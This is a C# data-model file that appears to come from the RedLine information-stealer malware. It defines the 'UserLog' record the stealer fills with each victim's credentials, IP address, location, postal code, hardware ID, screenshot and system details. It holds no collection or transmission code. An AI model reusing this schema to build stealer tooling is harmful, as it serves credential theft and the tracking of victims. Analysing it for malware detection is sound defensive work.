using System;
using System.Collections.Generic;
using System.Runtime.Serialization;

namespace RedLine.Reburn.Models.Info;

[DataContract(Name = "UserLog", Namespace = "v1/Models")]
public struct UserLog
{
	[DataMember(Name = "HWID")]
	public string HWID { get; set; }

	[DataMember(Name = "BuildID")]
	public string BuildID { get; set; }

	[DataMember(Name = "Username")]
	public string Username { get; set; }

	[DataMember(Name = "IsProcessElevated")]
	public bool IsProcessElevated { get; set; }

	[DataMember(Name = "OS")]
	public string OS { get; set; }

	[DataMember(Name = "CurrentLanguage")]
	public string CurrentLanguage { get; set; }

	[DataMember(Name = "MonitorSize")]
	public string MonitorSize { get; set; }

	[DataMember(Name = "LogDate")]
	public DateTime LogDate { get; set; }

	[DataMember(Name = "Credentials")]
	public Credentials Credentials { get; set; }

	[DataMember(Name = "Country")]
	public string Country { get; set; }

	[DataMember(Name = "Location")]
	public string Location { get; set; }

	[DataMember(Name = "TimeZone")]
	public string TimeZone { get; set; }

	[DataMember(Name = "IP")]
	public string IP { get; set; }

	[DataMember(Name = "Screenshot")]
	public byte[] Screenshot { get; set; }

	[DataMember(Name = "FingerPrint")]
	public FingerPrint FingerPrint { get; set; }

	[DataMember(Name = "Exceptions")]
	public List<string> Exceptions { get; set; }

	[DataMember(Name = "PostalCode")]
	public string PostalCode { get; set; }
}
